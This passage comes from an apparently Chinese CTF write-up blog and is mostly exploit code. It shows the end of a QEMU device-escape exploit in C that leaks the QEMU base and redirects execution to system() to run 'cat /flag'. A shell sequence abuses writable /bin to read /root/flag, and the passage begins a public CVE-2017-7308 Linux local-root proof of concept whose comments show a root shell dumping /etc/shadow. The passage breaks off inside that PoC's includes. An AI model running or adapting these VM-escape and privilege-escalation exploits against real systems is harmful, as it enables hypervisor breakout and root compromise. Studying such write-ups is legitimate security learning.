class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">misx_mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">misx_pba_mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    outb(value,pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)inb(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reset_cmd</span><span class="params">()</span>&#123;</span><br><span class="line">  misx_pba_mmio_read(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_cmd</span><span class="params">(<span class="type">int8_t</span> value)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set cmd %d\\n&quot;</span>, value);</span><br><span class="line">  reset_cmd();</span><br><span class="line">  <span class="keyword">if</span>(value != <span class="number">1</span>)&#123;</span><br><span class="line">    misx_mmio_write(<span class="number">0</span>, value, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_encode_func</span><span class="params">()</span>&#123;</span><br><span class="line">  set_cmd(<span class="number">3</span>);</span><br><span class="line">  misx_mmio_write(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reset_encode</span><span class="params">()</span>&#123;</span><br><span class="line">  misx_pba_mmio_read(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_key</span><span class="params">(<span class="type">uint8_t</span> *value, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set key\\n&quot;</span>);</span><br><span class="line">  set_cmd(<span class="number">1</span>);</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt; len; i++)&#123;</span><br><span class="line">    misx_pba_mmio_write(i, value[i], <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_input</span><span class="params">(<span class="type">uint8_t</span> *value, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set input\\n&quot;</span>);</span><br><span class="line">  set_cmd(<span class="number">2</span>);</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0x80</span>; i&lt; len + <span class="number">0x80</span>; i++)&#123;</span><br><span class="line">    misx_pba_mmio_write(i, value[i - <span class="number">0x80</span>], <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_mode</span><span class="params">(<span class="type">uint8_t</span> value)</span>&#123;</span><br><span class="line">  set_cmd(<span class="number">2</span>);</span><br><span class="line">  misx_mmio_write(<span class="number">0</span>, value, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">call_encode</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call encode\\n&quot;</span>);</span><br><span class="line">  set_mode(<span class="number">1</span>);</span><br><span class="line">  set_cmd(<span class="number">3</span>);</span><br><span class="line">  misx_mmio_read(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_output</span><span class="params">(<span class="type">uint8_t</span> *buf, <span class="type">int</span> offset,  <span class="type">int</span> len)</span>&#123;</span><br><span class="line">  set_cmd(<span class="number">3</span>);</span><br><span class="line">  <span class="comment">// offset += 0x110;</span></span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = offset; i &lt; offset + len; i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;current reading is %p\\n&quot;</span>, offset);</span><br><span class="line">    buf[i-offset] = misx_pba_mmio_read(i, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> misx_mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource4&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (misx_mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;misx_mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  misx_mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, misx_mmio_fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (misx_mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">&quot;mmap misx_mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;iopl 3 failed\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">  set_encode_func();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set encode function finished\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">1</span>, <span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">  set_key(buf, <span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set key finished\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">2</span>, <span class="number">0x300</span>);</span><br><span class="line">  set_input(buf, <span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set input finished\\n&quot;</span>);</span><br><span class="line">  call_encode();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">  get_output(buf, <span class="number">0x190</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="type">uint64_t</span> elf_address = *(<span class="type">uint64_t</span> *)buf;</span><br><span class="line">  <span class="type">uint64_t</span> qemu_base = elf_address - <span class="number">0x4fa470</span>;</span><br><span class="line">  <span class="type">uint64_t</span> system_plt = qemu_base + <span class="number">0x2a6bb0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;leak elf address is %p\\n&quot;</span>, elf_address);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;qemu base is %p\\n&quot;</span>, qemu_base);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system plt address is %p\\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">  reset_encode();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;cat /flag       &quot;</span>);</span><br><span class="line"></span><br><span class="line">  set_key(buf, <span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf, &amp;system_plt, <span class="number">0x8</span>);</span><br><span class="line">  set_input(buf, <span class="number">0x8</span>);</span><br><span class="line">  call_encode();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">1</span>, <span class="number">0x300</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf, &amp;system_plt, <span class="number">0x6</span>);</span><br><span class="line">  set_input(buf, <span class="number">0x80</span>);</span><br><span class="line">  call_encode();</span><br><span class="line"></span><br><span class="line">  getchar();</span><br><span class="line">  call_encode();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="W2L"><a href="#W2L" class="headerlink" title="W2L"></a>W2L</h2><p>看了NULL的题解，发现权限配置错误可以直接非预期。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> bin bin1</span><br><span class="line">/bin1/mkdir bin</span><br><span class="line">/bin1/chmod 777 bin</span><br><span class="line">/bin1/echo <span class="string">&quot;/bin1/cat /root/flag&quot;</span> &gt; /bin/umount</span><br><span class="line">/bin1/chmod 777 /bin/umount</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目是拿CVE-2017-7308这个漏洞改的。具体的漏洞分析在另一个文件中。这里给出的脚本中关闭了<code>smep,smap</code>。没有开启<code>KASLR</code>。那么其实拿漏洞的<code>poc</code>改一下就行了。</p><h3 id="未开启KASLR"><a href="#未开启KASLR" class="headerlink" title="未开启KASLR"></a>未开启KASLR</h3><p>一种方式是和之前漏洞利用相同，覆写timer_list将代码指向用户空间执行提权脚本。还有一种方法就是多个<code>fork</code>。利用<code>cred_jar</code>这个<code>slab</code>内存对象分配完毕之后也需要申请页面来创建新的<code>slab</code>来达到覆写的目的。第二种方法这里需要调试一下一个<code>slab</code>占用的页面的大小，每一个<code>cred_jar</code>的<code>slab</code>占用的是一个页面的大小。</p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A proof-of-concept local root exploit for CVE-2017-7308.</span></span><br><span class="line"><span class="comment">// Includes a SMEP &amp; SMAP bypass.</span></span><br><span class="line"><span class="comment">// Tested on 4.8.0-41-generic Ubuntu kernel.</span></span><br><span class="line"><span class="comment">// &lt;https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ uname -a</span></span><br><span class="line"><span class="comment">// Linux ubuntu 4.8.0-41-generic #44~16.04.1-Ubuntu SMP Fri Mar 3 ...</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ gcc pwn.c -o pwn</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ ./pwn</span></span><br><span class="line"><span class="comment">// [.] starting</span></span><br><span class="line"><span class="comment">// [.] namespace sandbox set up</span></span><br><span class="line"><span class="comment">// [.] KASLR bypass enabled, getting kernel addr</span></span><br><span class="line"><span class="comment">// [.] done, kernel text:   ffffffff87000000</span></span><br><span class="line"><span class="comment">// [.] commit_creds:        ffffffff870a5cf0</span></span><br><span class="line"><span class="comment">// [.] prepare_kernel_cred: ffffffff870a60e0</span></span><br><span class="line"><span class="comment">// [.] native_write_cr4:    ffffffff87064210</span></span><br><span class="line"><span class="comment">// [.] padding heap</span></span><br><span class="line"><span class="comment">// [.] done, heap is padded</span></span><br><span class="line"><span class="comment">// [.] SMEP &amp; SMAP bypass enabled, turning them off</span></span><br><span class="line"><span class="comment">// [.] done, SMEP &amp; SMAP should be off now</span></span><br><span class="line"><span class="comment">// [.] executing get root payload 0x401516</span></span><br><span class="line"><span class="comment">// [.] done, should be root now</span></span><br><span class="line"><span class="comment">// [.] checking if we got root</span></span><br><span class="line"><span class="comment">// [+] got r00t ^_^</span></span><br><span class="line"><span class="comment">// root@ubuntu:/home/user# cat /etc/shadow</span></span><br><span class="line"><span class="comment">// root:!:17246:0:99999:7:::</span></span><br><span class="line"><span class="comment">// daemon:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// bin:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Andrey Konovalov &lt;andreyknvl@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 